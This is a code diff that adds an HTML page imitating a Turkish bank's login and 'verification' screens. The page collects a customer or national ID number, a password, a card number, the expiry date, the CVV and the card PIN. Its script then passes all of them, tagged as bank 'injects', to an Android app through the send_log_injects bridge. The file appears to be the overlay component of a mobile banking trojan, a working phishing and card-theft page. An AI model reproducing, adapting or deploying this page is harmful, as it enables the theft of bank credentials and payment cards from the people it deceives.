@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+   <style>
+        body{
+            background-color:#f2f2f2
+            }
+        header{
+            padding: 20px;
+            background-color: #0c7f00;
+            color: white;
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+        .a1{
+            width: 100%;
+            padding: 8px;
+            
+            border: 0;
+            border-top: 2px solid #c8c8ca;
+            border-bottom: 2px solid #c8c8ca;
+            background-position: left;
+            background-position-x: left 10px;
+            padding-left: 45px
+        }
+        .kub{
+             background: #f2f2f2;
+             width: 100%;
+             height: 100%;
+        }
+        .login{
+            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnBAMAAACRTyc4AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6M0I2NUUzNTc2NjBBMTFFQTlDODJGRTRERERGREI4MzMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6M0I2NUUzNTg2NjBBMTFFQTlDODJGRTRERERGREI4MzMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozQjY1RTM1NTY2MEExMUVBOUM4MkZFNEREREZEQjgzMyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozQjY1RTM1NjY2MEExMUVBOUM4MkZFNEREREZEQjgzMyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuEgizAAAAAnUExURby8vL29vb6+vs3Nzc7Ozs/Pz93d3d7e3t/f3+7u7u/v7/7+/v////GRFVgAAAFsSURBVBgZBcExiiRlAIDRf8AD9DcM1NJO0pGJyUbGBbUIw1ymUByQTow28RA2TiL0CbQChx1t6X6H8r0BNr8vLS+AAa5zy/dLD0cw4Dp/Ottcf+kIA+YnwDrBwOsEbKx7DP7sDOC6OzP47Ym/AL7sGZsZwI3rA8NlAq/Ld+D0vA3rEdZqcuOyN6zYLtVhd4TF+HeCt6r2cDqPy7ewVvUA/zyPtyPMVXd38P71WI8wV/cF1/1YwVx1CDyMT2CuKrCMBXys6gEs4wNYq3oA85jAXFVgHQuYqwqsYwGnqsMHNpaxgFPV3QSWMYMvVT2CaZzOcD1U/QqX/fj7edtQdX+Gy+N4f7xxM+8qG96O4zrhZu3QBNbz8PEMazWByXB6xnWuOuLyaLhMvI6q7l9Yjwbrz3O1qw5NLxOD96qqut/1zMBc1V1VX2Hgv6rqUB3ZBpu1w66qJjYDrFXVN2DcwI9VPZ1tGIDLTz98/gPwPx0/hty0gBCnAAAAAElFTkSuQmCC);
+            background-repeat: no-repeat;
+            background-size: 25px;
+        }
+        .password{
+            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnBAMAAACRTyc4AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NTBFQkVGQjg2NjBBMTFFQUIwNUNFRjFERTUxNTBGMDAiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NTBFQkVGQjk2NjBBMTFFQUIwNUNFRjFERTUxNTBGMDAiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo1MEVCRUZCNjY2MEExMUVBQjA1Q0VGMURFNTE1MEYwMCIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo1MEVCRUZCNzY2MEExMUVBQjA1Q0VGMURFNTE1MEYwMCIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PsegZc4AAAAqUExURby8vL29vb6+vs3Nzc7Ozs/Pz93d3d7e3t/f3+7u7u/v7/Dw8P7+/v///+4a6rIAAAFzSURBVCjPZZLBihQxEIarr56mpNnADHPYRxC8DtjYMrCQg+CDGBVGZPMQXgXBlsbDuH1bEHwBTzkMBgJtvnfxkO6ZXrYuST7+qr8IvwAB4PjjN1NJOfrXqrr6tGS97o9ffn1Qc2F9PQSAtDrMLKkHIJAqPzG3m6eTrgpLV5OKQHYeBJyHB0IhmemZAXADkk+2rNMcMpDjFuHtLUDSqriPBqG0ug3vyq35KmkLgMKoA0Bn5eSBYtR4gGjlW2EboLMA41ockIlr4PPMWoDCuh0hQPuA2QDQigH4d2+Ox5/uZgB4IyYDsVJVVbUATmqAWJDuCnu1ZLbMawHiU70+s+fy7JHOSDfkvGCB0cjJ5qJbTbo/W4k2QFxdeqOVcZ3h72Ke80JbfM/7KULnZ9+qspAMQlxDOpQa4LtHQFmWgszfO1XclGxcD2c0NiUbdObMuidz/pr9lI6+vptZ0j3A2NfDJbup0f3Hl03tlxnn/Yuqvpm8/gMHyt5u7KUaAAAAAABJRU5ErkJggg==);
+            background-repeat: no-repeat;
+            background-size: 25px;
+            border: 0;
+            border-top: 0px solid #c8c8ca;
+            border-bottom: 2px solid #c8c8ca;
+        }
+        .login:focus{
+            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnCAMAAABUv8o5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6N0M2NjVBODU2NjBBMTFFQUE0QUY4MDg2RDAzQzZEMzkiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6N0M2NjVBODY2NjBBMTFFQUE0QUY4MDg2RDAzQzZEMzkiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo3QzY2NUE4MzY2MEExMUVBQTRBRjgwODZEMDNDNkQzOSIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo3QzY2NUE4NDY2MEExMUVBQTRBRjgwODZEMDNDNkQzOSIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgBxUkEAAABRUExURRwcGhwcHB0dGx0dHR0eGR4eHB4eHlVVU1ZWVFZWVldXVY2Ni46OjI6Ojo6Pio+PjY+Pj8bGxMbGxsfHxcfHx8jIxsjIyP7+/P7+/v///f///0DYOHcAAAGeSURBVDjLjZTrcgIhDIXTrNasDdo2qOD7P2gTWCEw60zzY51dP04uHIDnEPkmcrmwSB6/g3+JKyHi4aAPDOENJsqQxLviMQQleQeL65Ek55Ys8wlXU0wN03+/kOJzClXk7NQKNRadquIrMYyvc1zxlBvGTXyOzMAbNmpluQ1TM4lUMF/XiiX60DJhLmqMsVVNCJXD1ne0XIq5lDZUPBZsaR/PugS0spw2Md6UimRbLLgq5rrkV0r7oV6dYuLK7ZUtC2LvHX+AsTdPL2rGBIjqdo2YhVtOL+xRk77F3DgSe4rSgF3dqjdqNgH+F0a016mfW23h7E4Dum3gnU6bG3rkbmNk3QXpH2Kn+t48RLHBbQ07Kpa2xQ81BzxXf1hop8+y9aogE+b8kcqxCWbLM/kJbTFMs7j3hnePQdEj5+hqch2DVMMQVar4nOsEpLQIxU+6Nt6pO7eggCFaSsPBivxdqBu3nxrrhCxlOaf6DIPOEHpSUru4eKsc/a66jqH5fQ4wUvJ8W4blYya/d+/eMFZHfXcSjPdjWD8XC6LxLv8D0yxhmHszUEAAAAAASUVORK5CYII=);
+
+        }
+        .password:focus{
+            background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACYAAAAnCAMAAABUv8o5AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjcyQ0E4QkY2NjBBMTFFQUI0QUVDMTlGNkI2NTJDMjIiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjcyQ0E4QzA2NjBBMTFFQUI0QUVDMTlGNkI2NTJDMjIiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2NzJDQThCRDY2MEExMUVBQjRBRUMxOUY2QjY1MkMyMiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2NzJDQThCRTY2MEExMUVBQjRBRUMxOUY2QjY1MkMyMiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PuGrCeYAAABvUExURR8fHyAeHyAgICEfICIeHyIgISMdHyMfICQeICQgISUfIVdXV1dZWFhYWFlXWFlZWVpYWVtXWFxYWY+Pj5COj5CQkJGPkJKQkZOPkJSQkcbIx8fFxsfHx8jGx8jIyMnHyP7+/v7////9/v/+/////1udyM8AAAHkSURBVDjLfZTbetQwDISdDtRZigVhGzW0NiSref9n5MKOD9v90E0S57ckjyw5DhaDyASR63Vcd+fLcVgSACJhFQH8ttkj7F3wU5KZkWa3tHnv1xEzIxcfYvNMkgq/meX3gsXgtxYi/zL77SVVzG6WgMh7Ow5GINmJWYIk7g8wJkGq2OJHYG+P+BROTPu8GOM1dmzmHHfF2tL+u3jAL12mKxLpSMUgwiLq/VPHiZCO66RtqUi6QszOuAnJHFe0oqxnllKEIEkTMWdoJTFF8ZwgbXPAzSliPZUVlciPHvszJZcPUPelB94IcSL/x3aSMmImLuaL1HvbKeLQ5FgFT0EkBBEBpB1NULHjOMQPFiq2+Rr0M/ZSL02HkQyXisxz9nYc3Mnl14AV5jJgJJfF6dSwefZ+fu5zyxjUpXa9w/yc/dxhVyRnUhV68ZfuBJdA7uROU5hrday53QlieDNnCWK3Uqq5hfQ+FEEUpDMTfFjBvg1YkQ2aW+asX8BgOehNYaWzzoLZYCwh1fY8HBRal8d2tdfsIs8QmbS1SI8p1LpR81Y+R7MNMgwu06/TOkwGknH5cm6uY1ABbR7z7PwRP01Ls9cJWNcYyRjfvwPQ5tv1uah2qsU+BdcnZGYpqWpKref3nST/AUxSn9LGt3CzAAAAAElFTkSuQmCC)
+        }
+        .submit{
+             padding: 10px;
+             width: 100%;
+             margin-bottom: 15px;
+             color: white;
+             border: 0;
+             border-top: 2px solid #c8c7cd;
+             background: #2ea8ab;
+             border-bottom:1px solid #5a959b;
+        }
+        .btn{
+            color: #2ea8ab;
+            background: white;
+            border: 1px solid #2ea8ab;
+            width: 100%;
+            border-radius: 0px;
+            padding: 10px;
+            margin-bottom: 5px;
+        }
+
+        .error {
+            border-bottom: 2px solid #f00 !important;
+        }
+
+        input {
+            outline: none;
+            box-shadow: none;
+        }
+
+        .submit:disabled {
+            opacity: 0.3;
+        }
+   </style>
+</head>
+<body>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                Giriş
+            </header>
+            <div class="kub">
+                <input class="a1 login" id="login" name="login" type="text" placeholder="Müşteri / T.C. Kimlik Numarası" autocomplete="off">
+                <input class="a1 password" id="password" name="password" type="password" placeholder="Parola" autocomplete="off">
+                
+                <div class="p-3">         
+                    <input type="submit" class="submit" id="nextPage" value="Giriş">
+                    
+                    <input type="submit" disabled class="btn" value="Müşteri Numaramı Unuttum">
+                    <input type="submit" disabled class="btn" value="Parolamı Unuttum">
+                </div>
+            </div>
+        </div>
+
+        <div id="form2" style="display: none;">
+            <header>
+                Doğrulama
+            </header>
+            <div class="kub">                
+                <input type="tel" class="a1" id="cc" name="cc" placeholder="Kart Numarası" onkeyup="check6()" style="padding-left: 15px;" autocomplete="off">
+                <div>
+                    <input type="tel" class="a1" id="exp" name="exp" placeholder="Son Kullanma Tarihi" onkeyup="check4();check5()" style="float: left;width: 58%;border-top: 0;padding-left: 15px;" autocomplete="off">
+                    <input type="password" class="a1" id="cvv" name="cvv" placeholder="CVV" onkeyup="check5()" style="float: left;width: 42%;margin-bottom: 25px;border-top: 0;padding-left: 15px;" autocomplete="off">
+                    <input type="password" id="cardCode" name="cardCode" style="padding-left: 15px;" class="a1" maxlength="4" onkeyup="check5()" placeholder="Kart Şifresi">
+                    
+
+                </div>
+                <div class="p-3">         
+                    <input type="submit" class="submit" id="sendData" disabled value="Giriş">
+                </div>
+            </div>
+        </div>
+    </form>
+
+    <script>
+        $('#login').mask('00000000000')
+        $('#password').mask('000000')
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+		$('#cardCode').mask('0000')
+
+
+        var form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+            sendDataFull = document.getElementById('sendDataFull');
+             var month_;
+		var year_;
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+                return true
+            }
+        }
+
+        function check4() {
+            var mmYY = exp.value.split('/');
+			var month = parseInt(mmYY[0]);
+			var year = parseInt(mmYY[1]);
+
+			var expArray = exp.value.split('/');
+			var today, someday;
+			var exMonth = expArray[0];
+			var exYear = "20" + expArray[1];
+
+			today = new Date();
+			someday = new Date();
+			someday.setFullYear(exYear, exMonth, 1);
+                
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 35) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check5() {
+            if(check4() == true && exp.value.length === 5 && cvv.value.length === 3 && cardCode.value.length === 4) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        nextPage.onclick = () => {
+            if(login.value.length != 11) { 
+                login.classList.add('error')
+            } else {
+                login.classList.remove('error')
+            }
+            
+            if (password.value.length != 6) {
+                password.classList.add('error');
+            }  else {
+                password.classList.remove('error')
+            }
+            
+            if(login.value.length == 11 && password.value.length == 6) {
+                form1.style.display = 'none'
+                form2.style.display = 'block'
+            } 
+        }
+
+        sendData.onclick = () => {
+            var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.cardCode = cardCode.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+    </script>
+</body>
+</html>
